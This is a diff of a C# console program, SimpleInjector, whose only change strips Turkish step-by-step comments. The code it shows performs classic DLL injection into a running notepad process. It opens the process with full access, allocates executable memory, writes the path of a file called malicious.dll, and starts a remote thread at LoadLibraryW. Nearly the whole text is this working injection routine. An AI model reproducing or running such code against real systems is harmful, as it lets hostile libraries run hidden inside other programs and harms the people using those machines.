@@ -23,7 +23,6 @@ class SimpleInjector {
     public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
 
     static void Main() {
-        // NOT: malicious.dll dosyasının bu yolda olduğundan emin ol!
         string dllPath = @"C:\temp_test\malicious.dll"; 
         
         Process[] targets = Process.GetProcessesByName("notepad");
@@ -35,7 +34,6 @@ class SimpleInjector {
         Process target = targets[0];
         Console.WriteLine("Hedef Bulundu: " + target.ProcessName + " (PID: " + target.Id + ")");
 
-        // 1. Kapıyı çal (PROCESS_ALL_ACCESS = 0x1F1FFF)
         IntPtr hProc = OpenProcess(0x1F1FFF, false, target.Id);
         if (hProc == IntPtr.Zero) {
             Console.WriteLine("Hata: Handle alınamadı! (Hata Kodu: " + Marshal.GetLastWin32Error() + ")");
@@ -44,14 +42,12 @@ class SimpleInjector {
         }
         Console.WriteLine("Handle Alındı: 0x" + hProc.ToString("X"));
 
-        // 2. Bellekte yer aç
         IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)((dllPath.Length + 1) * 2), 0x3000, 0x40);
         if (addr == IntPtr.Zero) {
             Console.WriteLine("Hata: Bellek ayrılamadı! (Hata Kodu: " + Marshal.GetLastWin32Error() + ")");
             return;
         }
 
-        // 3. DLL yolunu yaz
         IntPtr bytesWritten;
         byte[] buffer = Encoding.Unicode.GetBytes(dllPath);
         bool writeSuccess = WriteProcessMemory(hProc, addr, buffer, (uint)buffer.Length, out bytesWritten);
@@ -60,7 +56,6 @@ class SimpleInjector {
             return;
         }
 
-        // 4. Thread başlat
         IntPtr loadLibAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW");
         IntPtr threadId;
         IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLibAddr, addr, 0, out threadId);
